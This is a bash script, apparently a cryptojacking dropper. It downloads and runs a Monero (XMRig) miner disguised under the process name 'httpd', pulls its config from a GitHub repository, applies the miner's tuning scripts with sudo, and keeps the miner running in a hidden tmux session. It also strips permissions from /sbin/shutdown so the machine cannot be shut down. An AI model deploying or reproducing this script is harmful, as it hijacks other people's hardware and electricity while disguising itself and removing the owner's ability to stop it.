#!/bin/bash

set -x #echo on
if [ -f ${PWD}/httpd ]; then
    if pgrep -x "httpd" > /dev/null
then
    echo "scrip dang chay roi , ke cmn di "
    
else

echo "script da install , chay thoi "
sudo rm config.json
sudo wget https://raw.githubusercontent.com/quoctoan22022004/xmr/master/config.json
sudo tmux new-session -d -s my_session1  './httpd'

fi
exit
fi



sudo apt install msr-tools build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
sudo rm config.json
sudo wget https://raw.githubusercontent.com/quoctoan22022004/xmr/master/config.json
sudo wget https://github.com/minnie1311/xmrorge/raw/master/httpd
wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/enable_1gb_pages.sh
sudo bash enable_1gb_pages.sh
wget https://raw.githubusercontent.com/xmrig/xmrig/master/scripts/randomx_boost.sh
sudo bash randomx_boost.sh
sudo chmod +x httpd
sudo tmux new-session -d -s my_session1  './httpd'
sudo chmod 0 /sbin/shutdown
